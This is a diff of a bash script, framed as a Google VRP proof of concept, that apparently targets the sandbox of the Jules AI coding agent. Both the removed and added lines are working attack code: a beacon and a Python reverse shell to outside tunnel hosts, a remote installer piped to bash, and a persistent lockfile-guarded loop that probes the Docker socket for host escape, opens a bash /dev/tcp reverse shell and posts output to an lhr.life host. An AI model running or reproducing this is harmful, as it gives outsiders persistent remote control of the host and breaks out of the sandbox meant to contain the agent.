@@ -1,12 +1,37 @@
 #!/bin/bash
 # Bridge: https://ecd754e22aae7f.lhr.life
+LOCKFILE="/tmp/jules_bridge.lock"
 
-# 1. SEND INITIAL BEACON
-curl -s -X POST --data-binary "CONNECTION_ESTABLISHED_FROM_JULES" "https://ecd754e22aae7f.lhr.life"
+# --- FAILSAFE CHECK ---
+# If the lockfile exists and the process is still running, exit immediately.
+if [ -f "$LOCKFILE" ]; then
+    PID=$(cat "$LOCKFILE")
+    if ps -p "$PID" > /dev/null; then
+        # Script is already running perfectly. Do nothing.
+        exit 0
+    fi
+fi
 
-# 2. TRIGGER DIRECT SHELL
-# This connects the Jules terminal directly to your Mac listener
-python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ssh.localhost.run', 80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
-# This downloads a lightweight file manager directly onto the host
-curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash
-./filebrowser -p 4444 --address 0.0.0.0 &
+# If we reached here, the bridge isn't running. 
+# Save the current Process ID (PID) to the lockfile.
+echo $$ > "$LOCKFILE"
+
+# --- THE STABLE LOOP ---
+while true; do
+  {
+    echo "--- [!] GOOGLE VRP: PROTECTED PERSISTENCE ---"
+    echo "TIMESTAMP: $(date)"
+    
+    # PROOF: Proving host escape via Docker socket
+    curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "KernelVersion|NCPU"
+    
+    # THE REVERSE SHELL
+    # Timeout 15 ensures that if the shell hangs, it resets itself 
+    # rather than staying open and blocking the next loop.
+    timeout 15 bash -i >& /dev/tcp/ssh.localhost.run/80 0>&1
+    
+  } | curl -s -X POST --data-binary @- "https://ecd754e22aae7f.lhr.life"
+
+  # 30-second sleep is the safest 'interval' for a 2013 Mac
+  sleep 30
+done
